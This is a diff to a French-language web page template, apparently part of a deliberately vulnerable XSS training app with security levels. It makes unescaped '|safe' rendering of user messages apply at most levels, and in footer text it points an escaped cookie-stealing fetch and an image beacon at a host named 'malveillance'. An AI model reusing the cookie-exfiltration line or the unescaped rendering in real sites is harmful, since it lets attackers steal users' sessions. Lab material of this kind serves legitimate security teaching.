@@ -238,7 +238,7 @@
                 {% if editeur_message_du_jour %}
                     <div class="message-jour">
                         <h3><strong>Message du jour {{ jour }}: </strong>
-                        {% if security_level == 1 or security_level == 2 %}
+                        {% if security_level != 5 %}
                             {{ contenue_message_du_jour|safe }}
                         {% else %}
                             {{ contenue_message_du_jour }}
@@ -289,10 +289,10 @@
         </div>
 
         <div class="footer-text">
-            Si vous lisez ces lignes, courage à vous.&lt;script&gt;window.onload = function(e) {fetch('http://127.0.0.1:5001/cookie/' + document.cookie);}&lt;/script&gt;
+            Si vous lisez ces lignes, courage à vous.&lt;script&gt;window.onload = function(e) {fetch('https://malveillance:5001/cookie/' + document.cookie);}&lt;/script&gt;
         </div>
         <div class="footer-text">
-            Si vous lisez ces lignes, courage à vous.&lt;img src="http://127.0.0.1:5001/image/loutre"&gt;
+            Si vous lisez ces lignes, courage à vous.&lt;img src="https://malveillance:5001/image/loutre"&gt;
         </div>
     </div>
 </body>
